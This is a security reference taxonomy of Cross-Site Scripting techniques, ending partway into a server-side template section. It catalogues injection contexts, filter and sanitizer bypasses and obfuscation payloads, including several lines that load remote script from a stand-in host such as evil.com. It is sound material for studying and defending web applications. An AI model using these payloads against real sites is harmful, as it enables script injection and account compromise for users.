# Cross-Site Scripting (XSS) Mutation/Variation Taxonomy

---
## Classification Structure

This taxonomy organizes the full attack surface of Cross-Site Scripting (XSS) across three orthogonal axes:

**Axis 1 — Injection Context (Primary Axis):** The structural location within the document where attacker-controlled input is rendered or interpreted. This determines which parsing rules apply and which payload forms are viable. The injection context is the single most important factor governing what an attacker can and cannot do — identical payloads succeed or fail depending entirely on where they land.

**Axis 2 — Defense Bypass Mechanism (Cross-Cutting Axis):** The technique used to evade security controls that stand between input and execution. Modern XSS rarely succeeds through direct injection alone; instead, it exploits discrepancies between how defenses parse/validate input and how browsers interpret it. Each bypass type can apply across multiple injection contexts.

**Axis 3 — Exploitation Scenario (Impact Axis):** The post-exploitation action taken once JavaScript execution is achieved. This maps techniques to real-world consequences — from session hijacking to persistent browser-level compromise via service workers.

### Axis 2 Summary: Defense Bypass Types

| Bypass Type | Mechanism | Applicable Across |
|---|---|---|
| **Encoding Differential** | Input is decoded differently by filter vs. browser (URL-encoding, HTML entities, Unicode, double-encoding) | All contexts |
| **Parser Differential** | Sanitizer and browser disagree on DOM structure (mutation XSS, namespace confusion, node flattening) | §1, §2, §7 |
| **WAF Evasion** | Payload structure avoids signature/regex detection (parameter pollution, case variation, comment insertion, null bytes) | All contexts |
| **CSP Bypass** | Execution achieved despite Content Security Policy (JSONP endpoints, base-uri injection, nonce leakage, unsafe directives, form-action gap, polyglot same-origin scripts, dangling iframes) | §1, §3, §4, §10-3, §11-3 |
| **Sanitizer Bypass** | Input survives HTML sanitization libraries (DOMPurify, Bleach) via mutation, prototype pollution, or regex flaws | §1, §2, §7 |
| **Framework Bypass** | Exploiting framework-specific rendering (React dangerouslySetInnerHTML, Angular template injection, Vue v-html) | §3, §9 |
| **Protocol-Level** | Cookie parsing differentials, CRLF injection, content-type sniffing to achieve script execution | §4, §10 |

### Foundational Concept: The Browser Parsing Pipeline

XSS fundamentally exploits the browser's multi-stage parsing pipeline. User input passes through:

1. **Network layer** → HTTP headers, Content-Type negotiation, MIME sniffing
2. **HTML parser** → Tokenization, tree construction, error recovery, foreign content (SVG/MathML)
3. **Attribute parser** → Entity decoding, URL resolution, event handler compilation
4. **JavaScript engine** → Eval, Function constructor, template literals, dynamic import
5. **CSS parser** → url() resolution, expression() (legacy), @import
6. **DOM APIs** → innerHTML, document.write, postMessage handlers, Trusted Types sinks

Every transition between stages creates a potential discrepancy that attackers exploit. The taxonomy below is organized by where in this pipeline the injection occurs.

---

## §1. HTML Element Context

Injection into the content area between HTML tags, where the attacker can introduce new elements. This is the most classic and well-understood XSS context.

### §1-1. Direct Script Tag Injection

The most straightforward vector: injecting a `<script>` element that the browser executes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Inline script block** | `<script>alert(1)</script>` inserted into page body | No tag filtering; CSP allows `unsafe-inline` or no CSP |
| **External script load** | `<script src="https://evil.com/x.js"></script>` loads remote payload | CSP allows the attacker's domain or uses wildcard `*` |
| **Module import** | `<script type="module">import('https://evil.com/x.js')</script>` | CSP `script-src` governs module scripts and `import()` per spec; however, some legacy CSP implementations or misconfigured `script-src-elem` / `script-src` may fail to block dynamically constructed `import()` calls |
| **Nonce-reuse injection** | Script tag injected with a guessed or leaked CSP nonce | Nonce is static, predictable, or leaked via CSS attribute selectors |
| **Script via XSLT** | `<xsl:script>` or `<msxsl:script>` in XML-processed contexts | Application processes user input as XML/XSLT |

### §1-2. Event Handler Element Injection

Injecting HTML elements with inline event handlers that fire automatically or with minimal interaction.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Auto-firing events** | `<img src=x onerror=alert(1)>`, `<body onload=...>`, `<svg onload=...>` | Element rendered; `onerror` fires on intentionally broken resource |
| **Focus-based auto-fire** | `<input autofocus onfocus=alert(1)>`, `<div contenteditable autofocus onfocus=...>` | `autofocus` attribute triggers focus without user action |
| **Visibility-based events** | `<div oncontentvisibilityautostatechange=alert(1) style="content-visibility:auto">` | Browser supports `content-visibility` CSS property (2025 vector) |
| **Animation-triggered events** | `<div style="animation:x" onanimationstart=alert(1)>` with `@keyframes x {}` | CSS animations supported; `onanimationstart` fires automatically |
| **Exotic browser events** | `onwebkitplaybacktargetavailabilitychanged` on `<audio>`/`<video>` (Safari-specific) | Safari browser; specific media element events |
| **Interaction-dependent events** | `onclick`, `onmouseover`, `onpointerdown`, etc. | Requires user interaction (lower severity, but still exploitable) |

### §1-3. Embedded Object Injection

Injecting elements that load external content capable of script execution.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **iframe injection** | `<iframe src="javascript:alert(1)">` or `<iframe srcdoc="<script>alert(1)</script>">` | `srcdoc` bypasses some CSP; `javascript:` URI in src |
| **object/embed injection** | `<object data="data:text/html,...">`, `<embed src="javascript:...">` | Legacy elements often overlooked by filters |
| **SVG foreignObject** | `<svg><foreignObject><body onload=alert(1)>` | SVG rendering context allows embedded HTML via `foreignObject` |
| **frame/frameset javascript: URI** | `<frameset><frame src="javascript:alert(origin)">` — deprecated `<frame>` element accepts `javascript:` URI in `src` attribute. Bypasses XSS filters that blocklist common elements (`<script>`, `<iframe>`, `<img>`, `<svg>`) but omit `<frame>` from their tag patterns. Requires injection point before `<body>` tag | Injection before `<body>`; XSS filter uses incomplete tag blocklist; browser supports deprecated `<frame>` |
| **input type=image parameter injection** | `<input type="image" src="x" onerror="alert(1)">` — renders as a submit button that also appends `.x` and `.y` coordinate parameters on click. Can inject additional parameters via `formaction` attribute or exploit parameter pollution when extra `name.x`/`name.y` params are not expected | Form context; parameter-sensitive backend endpoint |
| **base tag hijacking** | `<base href="https://evil.com/">` redirects all relative URLs | `base-uri` CSP directive absent; relative script paths exist on page |

---

## §2. HTML Attribute Context

Injection into the value of an existing HTML attribute, where the attacker must break out of the attribute or leverage the attribute's semantics.

### §2-1. Attribute Value Breakout

Escaping the current attribute to inject new attributes or elements.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Quote breakout** | Input `" onfocus=alert(1) autofocus="` closes the attribute and injects event handler | Attribute value not entity-encoded; matching quote character allowed |
| **Tag breakout** | Input `"><script>alert(1)</script>` closes the tag entirely | No output encoding on `<` and `>` characters |
| **Backtick breakout (IE)** | Using `` ` `` as attribute delimiter in legacy Internet Explorer | Target uses legacy IE rendering modes |
| **Unquoted attribute injection** | Input `x onfocus=alert(1)` adds new attribute when value is unquoted | Server renders attribute without quotes |

### §2-2. Event Handler Attribute Injection

Adding event-handler attributes to existing elements.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Reflected into existing tag** | User input reflected as `<div class="[INPUT]">` → inject `" onmouseover=alert(1) x="` | Input lands inside an existing tag's attribute |
| **Autofocus chaining** | Injecting `autofocus onfocus=alert(1)` into any focusable element | Element supports autofocus (most elements in modern browsers) |
| **tabindex exploitation** | Adding `tabindex=0` to make non-focusable elements focusable, enabling `onfocus` | Combined with `autofocus` for auto-triggering |

### §2-3. Special Attribute Semantics

Exploiting attributes that have inherent execution capabilities.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **href/src javascript: URI** | `<a href="javascript:alert(1)">` | Filter does not block `javascript:` protocol; user clicks link |
| **action javascript: URI** | `<form action="javascript:alert(1)"><button>Submit</button></form>` | Form `action` attribute not validated |
| **formaction override** | `<button formaction="javascript:alert(1)">` overrides form action | Button with `formaction` inside a form |
| **data: URI in src** | `<iframe src="data:text/html,<script>alert(1)</script>">` | `data:` URIs not blocked |
| **meta refresh injection** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input reflected in meta tag; browser follows javascript: in refresh |
| **SVG animate href** | `<svg><a><animate attributeName=href values=javascript:alert(1)><text>click</text>` | SVG context; animation changes href to javascript: URI |
| **poster attribute** | `<video poster=javascript:alert(1)>` (limited browser support) | Legacy browser behavior |

### §2-4. Hidden Input and Meta Tag Exploitation

Achieving XSS from seemingly unexploitable injection points.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **accesskey + onclick on hidden input** | `<input type=hidden accesskey=x onclick=alert(1)>` triggered via Alt+Shift+X | Requires user to press specific key combination (Firefox) |
| **meta tag CSP injection** | Injecting `<meta http-equiv="Content-Security-Policy" content="...">` adds an additional CSP policy. Per spec, multiple CSPs are intersected — an additional policy can only make the effective policy **more restrictive**, never weaker. The attack vector is using an injected restrictive policy to block legitimate scripts (DoS/defacement) or to create a `report-uri` exfiltration channel, not to loosen existing protections | Input reflected before or alongside existing CSP |

---

## §3. JavaScript Context

Injection into inline or external JavaScript code, where the attacker's input is embedded within script blocks or JS string literals.

### §3-1. String Literal Breakout

Breaking out of JavaScript string contexts to inject executable code.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Quote termination** | Input `'; alert(1); '` closes string and injects statement | Server embeds user input in JS string without escaping quotes |
| **Template literal injection** | Input `` ${alert(1)} `` inside backtick-delimited template literal | Server uses template literals with user data |
| **Line terminator injection** | Using `\u2028` (Line Separator) or `\u2029` (Paragraph Separator) to break string | Pre-ES2019 environments where these terminate strings |
| **Escape sequence manipulation** | Input `\'; alert(1);//` where server adds `\` before `'`, resulting in `\\'; alert(1);//` | Server's escaping creates an escaped backslash, freeing the quote |
| **Script block closure** | Input `</script><script>alert(1)</script>` — HTML parser takes priority over JS parser | `</script>` inside a string literal still closes the script tag in HTML |

### §3-2. Dynamic Code Execution Sinks

User input reaching JavaScript functions that execute strings as code.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **eval() injection** | User input passed to `eval(userInput)` | Application uses eval with unsanitized data |
| **Function constructor** | `new Function('return ' + userInput)()` | Dynamically constructed functions |
| **setTimeout/setInterval strings** | `setTimeout('doSomething("' + userInput + '")', 1000)` | String argument to timer functions |
| **document.write()** | `document.write('<div>' + userInput + '</div>')` | Direct DOM write with unsanitized input |
| **innerHTML assignment** | `element.innerHTML = userInput` | DOM manipulation without sanitization |
| **jQuery html()** | `$(selector).html(userInput)` | jQuery convenience methods bypass text-only safety |
| **Angular expression** | `{{constructor.constructor('alert(1)')()}}` (AngularJS 1.x) | AngularJS template compiles user input |
| **Vue template compilation** | `v-html` directive or server-side template mixing | User input rendered as Vue template |

### §3-3. DOM Source-to-Sink Flows

Client-side XSS where user-controlled DOM sources flow into dangerous sinks without server involvement.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **location.hash to innerHTML** | `document.getElementById('x').innerHTML = location.hash.slice(1)` | Fragment identifier used as content |
| **location.search to document.write** | URL query parameter written directly to DOM | Client-side routing or parameter handling |
| **document.referrer exploitation** | Referrer URL injected into DOM via client-side code | Application reads and renders referrer |
| **window.name cross-origin** | Attacker sets `window.name` on their page, victim reads it | Legacy cross-origin data passing via window.name |
| **document.cookie to DOM** | Cookie values rendered in DOM without encoding | Client-side cookie display/processing |
| **Web Storage to DOM** | `localStorage`/`sessionStorage` values injected by attacker script and later rendered | Stored DOM XSS via poisoned storage |
| **URL fragment directive** | Exploiting Text Fragment API (`#:~:text=`) interactions with page scripts | Scripts process fragment directives |

---

## §4. URL/URI Context

Injection into URL-processing contexts, exploiting protocol handlers, URL parsing, and URI scheme interpretation.

### §4-1. Protocol Scheme Injection

Using executable protocol schemes where URLs are expected.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **javascript: URI** | `javascript:alert(1)` in any URL-accepting attribute | Protocol scheme not filtered; user navigates to link |
| **javascript: with encoding** | `java%0ascript:alert(1)`, `&#106;avascript:`, `\u006Aavascript:` | Filter checks literal string but browser decodes entities/escapes |
| **data: URI with HTML** | `data:text/html,<script>alert(1)</script>` | `data:` scheme allowed in context |
| **data: URI base64** | `data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==` | Base64 encoding evades pattern-matching filters |
| **vbscript: (legacy IE)** | `vbscript:MsgBox("XSS")` | Internet Explorer; legacy protocol handler |
| **blob: URI** | Constructing Blob URLs with HTML content containing scripts | Application creates and navigates to blob URLs |
| **Web Worker context XSS** | XSS inside a Web Worker (via attacker-controlled `new Worker(url)` or unsanitized message handler) executes in `WorkerGlobalScope` without DOM access. Escalation paths: same-origin `fetch()` with credentials for API abuse, `postMessage()` to parent window (if parent has unsafe message handler → DOM XSS), IndexedDB manipulation to poison shared storage, and `caches` API access for Service Worker cache poisoning | Worker source URL or message handler processes attacker-controlled input; escalation requires unsafe `postMessage` handling in parent or shared storage dependency |
| **Blob URL drag-and-drop escalation (Chrome)** | From Worker-confined XSS: create HTML Blob (`new Blob(['<script>...</script>'], {type:'text/html'})`), generate `blob:` URL via `URL.createObjectURL()`, leak URL externally via `fetch()`. Attacker page intercepts drag event, replaces `dataTransfer` data with leaked blob URL. When user releases mouse, blob URL opens in new tab inheriting victim origin — achieving full DOM XSS. Bypasses `ERR_UNSAFE_REDIRECT` by eliminating the initiator relationship between attacker and victim origins | Chrome browser; Worker XSS achieved; single user drag interaction required; attacker can host page that captures drag events |

### §4-2. URL Parser Differentials

Exploiting differences in how filters vs. browsers parse URLs.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Backslash normalization** | `javascript:\x0aalert(1)` — browsers normalize certain whitespace within scheme | Browser-specific whitespace tolerance in URL schemes |
| **Tab/newline insertion** | `java\tscript:alert(1)` or `java\nscript:alert(1)` | Browser ignores control characters within URL scheme |
| **Null byte truncation** | `javascript:\0alert(1)` — filter sees null byte, browser ignores it | Null byte handling differential |
| **Authority confusion** | `javascript://example.com/%0aalert(1)` — appears as comment, executes after newline | Filter sees "valid URL", browser executes JS after `//` comment |
| **URL-encoded scheme** | `%6A%61%76%61%73%63%72%69%70%74:alert(1)` | Some contexts decode URL encoding before scheme check |

### §4-3. Redirect-Based XSS

Exploiting server-side or client-side redirects to deliver XSS payloads.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Open redirect to javascript:** | Redirect endpoint sends `Location: javascript:alert(1)` | Server does not validate redirect target scheme |
| **Meta refresh redirect** | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | Input controls meta refresh URL |
| **DOM-based redirect** | `location.href = userInput` or `window.open(userInput)` | Client-side redirect with unsanitized input |
| **OAuth fragment leak** | Redirect preserves `#access_token=...` across 302, readable via `location.hash` | OAuth implicit flow combined with open redirect |
| **302 response body rendering (Firefox-specific)** | Standard browser behavior discards 302 redirect response bodies (PortSwigger: "ordinarily not displayed"). However, Firefox renders the HTML body of a 302 response when the `Location` header contains a scheme Firefox does not follow as a redirect — specifically `ws://`, `wss://`, or `resource://` (Gremwell research). Combined with header injection (`%0A` in a reflected parameter), an attacker can inject a non-redirectable scheme into `Location` and place an XSS payload in the response body, which Firefox then renders. Chrome and IE are not affected by this technique | Firefox browser; CRLF/header injection allowing `Location` header manipulation to non-HTTP scheme (`ws://`, `wss://`); 302 response includes HTML body with attacker-controlled content |

---

## §5. CSS Context

> **This section has been extracted into a dedicated document.** For the full CSS injection taxonomy — including data exfiltration via attribute selectors, font ligatures, CSP nonce leakage, UI manipulation, SVG filter abuse, user tracking, and legacy script execution vectors — see **[`css-injection.md`](css-injection.md)**.
>
> Key cross-references from this document:
> - CSP nonce leakage via CSS selectors → `css-injection.md` §5-1
> - CSS-based data exfiltration (scriptless) → `css-injection.md` §1, §2
> - CSS-to-XSS escalation chains → `css-injection.md` §5-3
> - Legacy script execution (`expression()`, `-moz-binding`, `behavior`) → `css-injection.md` §3

---

## §6. DOM Manipulation Context

Exploitation through DOM APIs and browser-native features that create or modify page structure.

### §6-1. DOM Clobbering

> For the full DOM clobbering mutation taxonomy — including gadget discovery methodology, clobberable sink patterns, and library-specific exploitation chains — see [`../05-client-side/dom-clobbering.md`](../05-client-side/dom-clobbering.md).

Overwriting JavaScript variables and API references by injecting HTML elements with specific `id` or `name` attributes.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Global variable clobbering** | `<img id="x">` makes `window.x` reference the element instead of expected JS object | Application checks `if (x)` or reads `x.y` where `x` is expected to be a JS variable |
| **Nested property clobbering** | `<a id=x><a id=x name=y href="javascript:alert(1)">` creates `x.y` via DOM collection | Application accesses `x.y` as a URL or value |
| **Form element clobbering** | `<form id=x><input name=y value=evil>` makes `x.y.value` attacker-controlled | Application reads form element properties |
| **document property clobbering** | `<img name=cookie>` clobbers `document.cookie` accessor | Scripts reference `document.cookie` after clobbering |
| **Clobbering in libraries** | Webpack `import.meta.url`, Google Closure, MathJax gadgets overwritten via DOM clobbering | Clobberable property flows into a script-loading sink (497+ gadgets identified) |

### §6-2. Prototype Pollution to XSS

Polluting JavaScript object prototypes to inject values that reach XSS sinks.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Polluted innerHTML gadget** | `Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'` consumed by code reading undefined property | Merge/clone operation with attacker-controlled deep keys |
| **Polluted src/href gadget** | `Object.prototype.src = 'javascript:alert(1)'` used by script/link loading code | Library reads `.src` from config without explicit assignment |
| **Polluted transport_url** | Google Analytics `transport_url` property polluted to access `script.src` sink | GA loaded with default config; prototype pollution source exists |
| **Sanitizer depth check bypass** | Prototype pollution weakens DOMPurify's nesting depth check, enabling nesting-based mXSS (CVE-2024-45801; DOMPurify < 2.5.4 and >= 3.0.0, < 3.1.3) | Prototype pollution occurs before or during sanitization; allows attacker to bypass depth limit and trigger node flattening mXSS |
| **Template engine gadgets** | Polluted properties consumed by Handlebars, Pug, or EJS template compilation | Server-side rendering with prototype pollution |
| **Implicit toString/valueOf gadget chain** | Prototype pollution sets `Object.prototype.toString` or `Object.prototype.valueOf` to return attacker-controlled strings. When polluted objects undergo implicit type coercion (string concatenation, comparison, template literal embedding), the overridden method injects executable content into sinks like `innerHTML` or `document.write` | Implicit type coercion on polluted object reaching a DOM write sink; no explicit property access required |

### §6-3. postMessage Exploitation

Exploiting cross-origin messaging APIs for XSS.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Missing origin validation** | Listener does `window.addEventListener('message', (e) => eval(e.data))` without checking `e.origin` | No origin check or wildcard origin |
| **Insufficient origin check** | `if (e.origin.indexOf('trusted.com') > -1)` bypassed with `trusted.com.evil.com` | Regex/substring origin validation |
| **Data to dangerous sink** | postMessage data flows to `innerHTML`, `location.href`, or `eval()` | Trusted message data treated as safe |
| **Wildcard targetOrigin** | `parent.postMessage(secret, '*')` leaks data to any embedding origin | Secrets sent with wildcard origin |

---

## §7. Markup Parser Differential Context (Mutation XSS)

Exploiting differences between how HTML sanitizers parse markup and how browsers reconstruct it. This is the most sophisticated XSS category.

> **Deep-Dive Reference:** For a comprehensive taxonomy of mXSS mutation mechanisms — including namespace switching, foster parenting, text content mode confusion, desanitization, nesting depth exploitation, and full CVE/bounty mapping — see the dedicated [`mutation-xss.md`](../05-client-side/mutation-xss.md) taxonomy.

### §7-1. DOM Mutation (mXSS)

Payloads that are safe when parsed by the sanitizer but become dangerous after the browser's HTML parser reconstructs the DOM.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Node flattening** | Deeply nested elements exceed browser's nesting limit; browser removes inner wrappers, exposing payload | DOMPurify < 2.5.0 and >= 3.0.0, < 3.1.3 (CVE-2024-47875); depth threshold varies by browser |
| **Namespace confusion** | MathML/SVG namespace causes element to be parsed differently than sanitizer expects | `<math><mtext><table><mglyph><style>` triggers foreign-content parsing rules |
| **Comment node mutation** | Sanitizer checks text nodes but ignores comments; browser converts comment content into active DOM after mutation | Comment containing encoded entity within math/SVG context |
| **Stack of open elements** | Browser's "adoption agency algorithm" restructures nesting in ways sanitizer cannot predict | Misnested formatting elements (`<b>`, `<i>`, `<a>`) cause tree reconstruction |
| **Template element escape** | Content inside `<template>` parsed in inert mode by sanitizer but activated when moved to live DOM | Sanitizer treats `<template>` content as safe |
| **Regex-based sanitizer bypass** | DOMPurify's template literal regex fails to catch edge cases (CVE-2025-26791) | `SAFE_FOR_TEMPLATES` mode with SVG edge cases |
| **Lexical parser state exploitation (LEXSS)** | Sanitizer's lexer interprets token boundaries differently than browser's tokenizer — input classified as inert text re-tokenizes as executable markup at the pre-DOM lexical analysis stage | Custom lexer-based sanitizer (not browser-native DOMParser); tokenizer state machine differential |
| **Nested parser context switching** | HTML/SVG/MathML nesting order produces different DOM trees in sanitizer vs. browser — context-switching rules in the specification are ambiguous at foreign content transition points, discoverable through systematic parser fuzzing | Multiple foreign content namespaces with nested transitions (e.g., `<svg>` inside `<math>`) |
| **Element rename/unrename bypass** | Custom sanitizer renames dangerous elements (e.g., `svg` → `proton-svg`) before DOMPurify processing, then renames them back; the rename-unrename cycle re-activates elements and event handlers that the sanitizer neutralized during its pass (SonarSource, Skiff/Proton Mail, 2023) | Custom pre/post-processing wrapping a sanitizer; element renaming reverses sanitization of namespace-sensitive elements |

### §7-2. Encoding-Level Mutation

Payloads that transform during character encoding or entity processing.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **UTF-7 injection** | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` interpreted as UTF-7 | Missing charset declaration; legacy browser auto-detection |
| **Double encoding** | `%253Cscript%253E` decoded twice — once by proxy/WAF, once by app | Multiple decoding layers in request processing |
| **HTML entity nesting** | `&amp;lt;` → `&lt;` → `<` after multiple parse passes | Server performs entity decoding before final output |
| **Overlong UTF-8** | Non-shortest-form UTF-8 bytes interpreted differently by filter vs. runtime | Legacy systems with lax UTF-8 validation |
| **Charset mismatch** | Server declares UTF-8 but content contains Shift_JIS sequences that consume quote characters | Character encoding mismatch between header and content |

### §7-3. Content-Type and MIME Confusion

Causing the browser to interpret content in a more dangerous MIME context.

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **MIME sniffing** | Browser ignores `Content-Type: text/plain` and interprets content as HTML | `X-Content-Type-Options: nosniff` header absent |
| **Content-Type via CRLF** | CRLF injection sets `Content-Type: text/html` for a non-HTML response | Header injection vulnerability |
| **SVG as image** | SVG file served as `image/svg+xml` executes embedded `<script>` tags | SVG file upload without content validation |
| **Polyglot files** | File valid as both image and HTML; browser renders as HTML in certain contexts | Content-Type negotiation or MIME sniffing |
| **KML/XML file rendering** | KML (Keyhole Markup Language) files are XML-based and can embed `<script>` or event handlers; when a web application renders KML content (e.g., map widgets, geo-data viewers) without sanitization, embedded JavaScript executes in the application's origin. Mixed-case tag names (`<ScRiPt>`) bypass keyword blacklists. Wormable when injected KML propagates to other users' views | Application renders user-uploaded KML/GeoXML content; tag-name blacklist is case-sensitive |
| **Content-Type override in cloud storage/CDN** | Cloud object storage (S3, GCS, Azure Blob) serves user-uploaded files with the `Content-Type` set at upload time by the uploading client. If the application does not enforce a safe Content-Type on upload, an attacker uploads an HTML file with `Content-Type: text/html` — served directly from the storage origin or through a CDN without re-validation. Serverless/edge environments (Cloudflare Workers, Lambda@Edge) that dynamically construct responses may omit or misconfigure Content-Type headers, triggering browser MIME sniffing that promotes text or JSON containing HTML markup to executable HTML context. CDN cache re-serialization can also strip or replace Content-Type headers during cache storage/retrieval cycles | User-controlled Content-Type on upload; CDN/storage serves directly without Content-Type override or `X-Content-Type-Options: nosniff`; shared origin between user content and application (no subdomain isolation) (Flatt Security, 2024) |
| **Safari Reader Mode re-rendering** | Safari's Reader Mode extracts article content and re-renders it through a separate HTML sanitization and parsing pipeline distinct from the normal rendering path. Payloads stripped or neutralized by the standard browser rendering (e.g., event handlers, `javascript:` URIs, custom element constructs) survive Reader Mode's different extraction and reconstruction rules, executing in the page's origin context when a user activates Reader Mode | Safari browser; page eligible for Reader Mode activation (sufficient article-like content); payload structure survives Reader Mode extraction pipeline (Nikhil Mittal, 2020) |

---

## §8. WAF/Filter Evasion Techniques

Systematic methods to bypass input validation, output encoding, and Web Application Firewalls. These techniques apply across multiple injection contexts.

### §8-1. Tag and Keyword Obfuscation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Case variation** | `<ScRiPt>`, `<SCRIPT>`, `<scRIPT>` | Case-sensitive filter matching |
| **Null byte insertion** | `<scr\x00ipt>` — filter stops at null, browser ignores it | Null byte handling differential |
| **Comment insertion** | `<scr<!--comment-->ipt>` or `<script/x>` | HTML parser error recovery; filter expects clean tags |
| **Tag name padding** | `<script\t\n\r >` with whitespace/control chars after tag name | Regex matches exact tag name without whitespace tolerance |
| **Slash substitution** | `<img/src=x/onerror=alert(1)>` — forward slash as attribute separator | HTML parser accepts `/` as whitespace equivalent in tags |
| **Rare/custom tags** | `<details open ontoggle=alert(1)>`, `<marquee onstart=alert(1)>` | Filter blocklist does not cover all HTML elements |
| **SVG/MathML tags** | `<svg><script>alert(1)</script></svg>` — foreign element context | Filter does not understand foreign content parsing |
| **XSS Auditor weaponization** | Injecting content matching legitimate scripts triggers Chrome's XSS Auditor block, selectively disabling defenses (frame-busters, security logic); auditor behavior also serves as XS-Leak content-detection oracle | Chrome < 78 with XSS Auditor enabled (historical; contributed to Auditor's removal) |

### §8-2. JavaScript Payload Obfuscation

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **String construction** | `window['al'+'ert'](1)` or `self[atob('YWxlcnQ=')](1)` | Filter blocks literal `alert`, `eval` keywords |
| **Template literal execution** | `` alert`1` `` — tagged template literal calls function without parentheses | Filter blocks `(` and `)` characters |
| **Arrow function** | `x=>alert(1)` or `(x=>{alert(1)})()` | Compact syntax evades pattern matching |
| **Constructor chain** | `[].constructor.constructor('alert(1)')()` | Accesses `Function` constructor without keyword |
| **Unicode escapes in JS** | `\u0061lert(1)` — JS interprets Unicode escapes in identifiers | Filter does not decode JS Unicode escapes |
| **Computed property access** | `window['alert'](1)`, `self['al'+'ert'](1)` | Bracket notation bypasses static keyword detection |
| **with statement** | `with(document)body.appendChild(createElement('script')).src='//evil.com'` | Avoids direct property references |
| **import() expression** | `import('https://evil.com/x.js')` — dynamic import in modern browsers | CSP `script-src` applies to `import()` per spec, but avoids `eval` keyword detection; useful when WAF/filter blocks `eval`/`Function` but not `import()` syntax |
| **top-level await** | `await import('//evil.com/x.js')` in module context | Module context available |

### §8-3. HTTP Parameter Pollution (HPP)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Payload splitting** | XSS payload split across duplicate parameters: `?q=<script>&q=alert(1)&q=</script>` | Server concatenates duplicate params (ASP.NET joins with `,`) |
| **Parameter override** | WAF checks first param, app uses last (or vice versa) | Different parameter precedence between WAF and application |
| **Array parameter confusion** | `?q[]=<script>&q[]=alert(1)` | Framework-specific array parameter handling |

### §8-4. AI-Generated Evasion (2025 Emerging)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Adversarial payload generation** | ML models generate novel payloads that bypass ML-based WAFs | WAF uses signature or ML detection; attacker uses adversarial AI |
| **Contextual mutation** | AI adapts payload structure based on observed WAF response patterns | Automated fuzzing with feedback loop |

---

## §9. Framework and Rendering Engine Context

XSS vectors specific to client-side frameworks, template engines, and rendering pipelines.

### §9-1. Client-Side Template Injection (CSTI)

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **AngularJS sandbox escape** | `{{constructor.constructor('alert(1)')()}}` (v1.x, sandbox removed in 1.6+) | AngularJS 1.x; user input in `ng-app` scope |
| **Vue v-html injection** | `v-html` directive renders raw HTML including scripts | Developer uses `v-html` with user data |
| **Vue template compilation** | Server mixes SSR templates with client-side Vue compilation | User input reaches Vue template compiler |
| **React dangerouslySetInnerHTML** | `dangerouslySetInnerHTML={{__html: userInput}}` | Developer explicitly opts into unsafe rendering |
| **React SSR hydration mismatch** | Server-rendered HTML differs from client hydration, causing unexpected DOM | SSR output contains user input not matching client expectation |
| **Svelte @html directive** | `{@html userInput}` renders raw HTML | Direct raw HTML rendering in Svelte |
| **Expression sandbox escape via toString gadget** | JavaScript expression sandboxes (custom eval wrappers, template engine sandboxes) restrict direct property access but allow implicit type coercion. Triggering implicit `toString` via string concatenation (`'' + obj`) or explicit `.toString()` on a native object invokes the object's prototype chain, which may return a `Function` constructor or other privileged reference outside the sandbox scope. Chaining `[].constructor.constructor('return this')()` through coercion escapes the sandbox to access the global `window` object | Expression sandbox permits member access but restricts direct `constructor` references; implicit coercion path to privileged prototype exists (CVE-2025-59840, lab.ctbb.show "Vega" research, 2025) |

### §9-2. Markdown and Rich Text Rendering

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Markdown link injection** | `[click](javascript:alert(1))` in markdown parser | Parser does not strip `javascript:` protocol (CVE-2025-24981) |
| **Markdown HTML passthrough** | `<script>alert(1)</script>` rendered verbatim in markdown | Parser allows raw HTML (common default) |
| **Markdown image injection** | `![x](data:text/html,<script>alert(1)</script>)` or `<img>` with event handler | Parser does not sanitize image source URIs |
| **HTML entity bypass in markdown** | `&#106;avascript:` in link URL bypasses denylist of `javascript:` | Filter checks literal string; parser decodes entities |
| **Rich text editor XSS** | WYSIWYG editor (TinyMCE, CKEditor, Quill) allows script injection via HTML mode | Insufficient output sanitization of editor content |
| **Clipboard/Paste injection** | Malicious HTML/SVG delivered via clipboard paste bypasses input sanitization — paste handlers insert unsanitized DOM fragments containing event handlers or script elements into `contenteditable` regions | Rich-text editor or `contenteditable` element processing paste events without clipboard content sanitization |
| **AMP for Email / Dynamic Email XSS** | AMP for Email (Gmail, Yahoo) allows dynamic content in emails via a restricted subset of HTML/CSS/AMP components. CSS parsing differences between the email client's sanitizer and its rendering engine allow injection of `<meta>` tags via CSS directives, bypassing the AMP validator's HTML restrictions and overriding CSP headers to enable script execution within the email rendering context | Email client supports AMP4Email/dynamic email rendering; CSS parser interprets constructs as HTML that the AMP validator does not catch |

### §9-3. Server-Side Template Injection (SSTI) to XSS

| Subtype | Mechanism | Key Condition |
|---|---|---|
| **Jinja2/Twig XSS** | `{{ '<script>alert(1)</script>' }}` without auto-escaping | Auto-escape disabled or `|safe` filter used |
